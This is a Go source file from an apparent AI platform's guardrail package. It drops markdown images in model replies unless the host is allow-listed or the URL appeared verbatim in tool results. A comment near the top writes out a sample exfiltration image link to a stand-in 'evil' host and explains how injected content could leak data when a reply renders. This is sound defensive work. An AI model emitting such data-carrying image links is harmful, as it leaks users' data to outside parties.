package guardrail

import (
	"net/url"
	"regexp"
	"strings"
)

// Markdown images are fetched by the reader's browser, so an injected `![x](https://evil/?d=...)`
// would send data out the moment the reply renders. Images are kept only from hosts the platform
// controls; any other image becomes its plain alt text.

// jsonAmp is how Go's JSON encoder writes "&" (a backslash, then u0026).
var jsonAmp = string(rune('\\')) + "u0026"

// DefaultImageHosts are always allowed.
var DefaultImageHosts = []string{
	"media.codevertexafrica.com",
	"marketflowapi.codevertexafrica.com",
	"marketflow.codevertexafrica.com",
}

var mdImage = regexp.MustCompile(`!\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+"[^"]*")?\s*\)`)

// SafeMarkdown drops markdown images whose host is not allowed. An image URL that appears word for
// word in seen (the turn's tool results, such as image search) is kept as well: a URL built to
// carry data out cannot appear there. extraHosts adds hosts the tenant owns (its website),
// compared without a leading "www.".
func SafeMarkdown(md string, seen []string, extraHosts ...string) string {
	if !strings.Contains(md, "![") {
		return md
	}
	allowed := map[string]bool{}
	for _, h := range append(append([]string{}, DefaultImageHosts...), extraHosts...) {
		if h = normHost(h); h != "" {
			allowed[h] = true
		}
	}
	return mdImage.ReplaceAllStringFunc(md, func(m string) string {
		sub := mdImage.FindStringSubmatch(m)
		alt, raw := sub[1], sub[2]
		u, err := url.Parse(raw)
		if err == nil && u.Scheme == "https" && allowed[normHost(u.Hostname())] {
			return m
		}
		if err == nil && (u.Scheme == "https" || u.Scheme == "http") && len(raw) >= 12 {
			// Go's JSON encoder writes & as & inside tool results.
			escaped := strings.ReplaceAll(raw, "&", jsonAmp)
			for _, s := range seen {
				if strings.Contains(s, raw) || strings.Contains(s, escaped) {
					return m
				}
			}
		}
		if strings.TrimSpace(alt) == "" {
			return ""
		}
		return alt
	})
}

func normHost(h string) string {
	h = strings.ToLower(strings.TrimSpace(h))
	if u, err := url.Parse(h); err == nil && u.Host != "" {
		h = u.Hostname()
	}
	return strings.TrimPrefix(h, "www.")
}
